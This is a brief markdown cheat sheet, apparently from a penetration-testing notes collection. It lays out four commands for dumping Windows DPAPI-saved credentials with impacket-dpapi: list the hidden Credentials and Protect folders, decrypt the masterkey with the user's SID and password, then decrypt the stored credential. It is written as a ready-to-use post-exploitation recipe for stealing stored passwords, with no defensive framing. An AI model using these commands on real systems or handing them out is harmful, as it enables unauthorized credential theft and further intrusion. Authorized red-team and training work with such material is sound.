# Impacket-dpapi

## Dump DPAPI credentials using impacket

### Steps:

#### 1)

    C:\Users\USER\AppData\Roaming\Microsoft\Credentials> dir -h

(Get and download the credential file)

#### 2) 

    C:\Users\USER\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> dir -h

(Get and download the masterkey file)

#### 3)

    impacket-dpapi masterkey -file MASTERKEY_FILE -sid USER_SID -password PASSWORD

(Dump the key from the masterkey file to decrypt the credential file)

#### 4) 

    impacket-dpapi credential -file CREDENTIAL_FILE -key DUMPED_KEY_FROM PREVIOUS_COMMAND

(Dump the DPAPI credential for our target user)
